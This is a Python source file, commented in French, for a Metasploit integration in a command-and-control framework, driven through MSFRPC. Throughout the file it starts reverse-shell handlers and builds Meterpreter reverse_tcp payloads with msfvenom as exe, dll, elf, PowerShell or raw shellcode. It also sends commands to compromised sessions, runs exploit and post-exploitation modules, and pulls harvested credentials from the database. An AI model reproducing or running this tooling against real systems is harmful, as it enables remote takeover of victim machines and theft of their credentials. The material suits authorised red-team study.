"""
Metasploit — Intégration MSFRPC complète.

Protocole : JSON-RPC sur HTTP (port 55553)
Démarrage : msfrpcd -P <password> -u <user> -a 0.0.0.0 -p 55553 -S

Méthodes MSFRPC :
  auth.login / auth.logout / auth.token_list
  console.create / console.destroy / console.list
  console.write / console.read / console.tabs
  module.execute / module.check / module.info / module.options
  module.search / module.exploits / module.payloads / module.auxiliary
  session.list / session.stop / session.ring_read / session.ring_put
  session.meterpreter_run_single / session.meterpreter_script
  session.meterpreter_session_detach / session.shell_read / session.shell_write
  job.list / job.stop / job.info
  db.hosts / db.services / db.vulns / db.loot / db.creds
"""
from __future__ import annotations

import asyncio
import logging
import uuid
from datetime import datetime
from typing import Any

from c2_manager.interfaces import MsfRpcC2Interface
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class MetasploitC2(MsfRpcC2Interface):
    """Intégration Metasploit via MSFRPC JSON."""

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "generate_payload",
        "module_execution", "session_management", "console_interaction",
        "db_query", "meterpreter", "shell_sessions",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._consoles: dict[str, str] = {}   # name → console_id

    # ── Console helper ────────────────────────────────────────────────────────

    async def get_or_create_console(self, name: str = "default") -> str:
        if name in self._consoles:
            return self._consoles[name]
        result = await self._call("console.create")
        cid = str(result.get("id", "0"))
        self._consoles[name] = cid
        logger.info("MSF : console créée id=%s", cid)
        return cid

    async def console_exec(self, command: str, console: str = "default") -> str:
        """Exécuter une commande dans la console MSF et lire le résultat."""
        cid = await self.get_or_create_console(console)
        await self._call("console.write", cid, command + "\n")
        # Attendre et lire le résultat
        output = ""
        for _ in range(20):
            await asyncio.sleep(0.5)
            result = await self._call("console.read", cid)
            output += result.get("data", "")
            if not result.get("busy"):
                break
        return output

    # ── Listeners (jobs) ─────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "tcp").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 4444))
        payload  = config.get("payload", f"linux/x64/shell/reverse_tcp")

        exploit  = "exploit/multi/handler"
        options  = {
            "LHOST":   host,
            "LPORT":   str(port),
            "PAYLOAD": payload,
        }
        options.update(config.get("options", {}))

        result = await self._call("module.execute", "exploit", exploit, options)
        job_id = str(result.get("job_id", uuid.uuid4()))

        logger.info("MSF : handler démarré job_id=%s [%s:%d]", job_id, host, port)

        return Listener(
            id=job_id,
            name=config.get("name", f"msf-handler-{port}"),
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=protocol,
            status="running" if job_id != "None" else "error",
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        result = await self._call("job.stop", listener_id)
        return result.get("result") == "success"

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        jobs = await self._call("job.list")
        return [
            Listener(
                id=str(jid),
                name=jinfo if isinstance(jinfo, str) else str(jinfo),
                c2_type=self._config.c2_type,
                bind_host="0.0.0.0",
                bind_port=0,
                protocol="msf",
                status="running",
            )
            for jid, jinfo in (jobs.items() if isinstance(jobs, dict) else [])
        ]

    # ── Sessions → Agents ────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        sessions = await self._call("session.list")
        agents = []
        for sid, s in (sessions.items() if isinstance(sessions, dict) else []):
            stype = s.get("type", "shell")
            agents.append(Implant(
                id=str(sid),
                name=s.get("info", str(sid)),
                c2_type=self._config.c2_type,
                listener_id=str(s.get("via_exploit", "")),
                external_ip=s.get("tunnel_peer", "").split(":")[0],
                internal_ip=s.get("target_host", ""),
                hostname=s.get("info", ""),
                username=s.get("username", ""),
                os=s.get("platform", ""),
                arch=s.get("arch", ""),
                pid=int(s.get("pid", 0)),
                process_name=s.get("via_exploit", ""),
                integrity="SYSTEM" if "system" in s.get("info", "").lower() else "USER",
                last_checkin=datetime.utcnow(),
                active=True,
            ))
        return agents

    # ── Tâches ───────────────────────────────────────────────────────────────

    async def send_task(
        self,
        agent_id: str,
        command: str,
        args: list[str] | None = None,
    ) -> Task:
        self._require_connected()
        task_id  = str(uuid.uuid4())
        full_cmd = command + (" " + " ".join(args) if args else "")

        sessions = await self._call("session.list")
        session  = sessions.get(agent_id, {}) if isinstance(sessions, dict) else {}
        stype    = session.get("type", "shell")

        try:
            if stype == "meterpreter":
                # Meterpreter command
                result_raw = await self._call(
                    "session.meterpreter_run_single", agent_id, full_cmd
                )
                # Lire le résultat
                await asyncio.sleep(1.0)
                output_raw = await self._call("session.meterpreter_read", agent_id)
                output = output_raw.get("data", "")
            else:
                # Shell session
                await self._call("session.shell_write", agent_id, full_cmd + "\n")
                await asyncio.sleep(0.5)
                output_raw = await self._call("session.shell_read", agent_id)
                output = output_raw.get("data", "")

            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=full_cmd,
                args=args or [],
                status="completed",
                result=output,
                completed_at=datetime.utcnow(),
            )
        except Exception as exc:
            return Task(
                id=task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=full_cmd,
                args=args or [],
                status="error",
                error=str(exc),
            )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        return {"note": "MSF : résultat inclus dans send_task()"}

    # ── Payload (msfvenom via console) ────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        format_map = {
            "exe":       "exe",
            "dll":       "dll",
            "elf":       "elf",
            "ps1":       "psh",
            "shellcode": "raw",
            "py":        "py",
        }
        msfvenom_fmt = format_map.get(config.format, "raw")
        os_map = {
            "windows": "windows",
            "linux":   "linux",
            "macos":   "osx",
        }
        platform = os_map.get(config.os, "linux")
        arch_map = {"x64": "x86_64", "x86": "x86"}
        arch = arch_map.get(config.arch, "x86_64")

        payload_name = config.extra.get(
            "payload",
            f"{platform}/{arch}/meterpreter/reverse_tcp"
        )
        lhost = config.extra.get("lhost", "127.0.0.1")
        lport = config.extra.get("lport", 4444)

        cmd = (
            f"msfvenom -p {payload_name} "
            f"LHOST={lhost} LPORT={lport} "
            f"-f {msfvenom_fmt} -o /tmp/{config.name}\n"
        )
        logger.info("MSF generate payload : %s", cmd.strip())
        output = await self.console_exec(cmd)
        logger.info("msfvenom output : %s", output[:200])

        # Lire le fichier généré
        import os
        out_path = f"/tmp/{config.name}"
        if os.path.exists(out_path):
            with open(out_path, "rb") as f:
                return f.read()
        return b""

    # ── Module execution ──────────────────────────────────────────────────────

    async def execute_module(
        self,
        module_type: str,
        module_name: str,
        options: dict[str, Any],
    ) -> dict[str, Any]:
        """Exécuter un module MSF (exploit, auxiliary, post)."""
        self._require_connected()
        result = await self._call("module.execute", module_type, module_name, options)
        return result

    async def search_modules(self, query: str) -> list[dict[str, Any]]:
        """Rechercher des modules MSF."""
        self._require_connected()
        result = await self._call("module.search", query)
        if isinstance(result, list):
            return result
        return []

    # ── Base de données ───────────────────────────────────────────────────────

    async def get_hosts(self) -> list[dict[str, Any]]:
        self._require_connected()
        return await self._call("db.hosts", {})

    async def get_creds(self) -> list[dict[str, Any]]:
        self._require_connected()
        return await self._call("db.creds", {})

    async def get_vulns(self) -> list[dict[str, Any]]:
        self._require_connected()
        return await self._call("db.vulns", {})

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
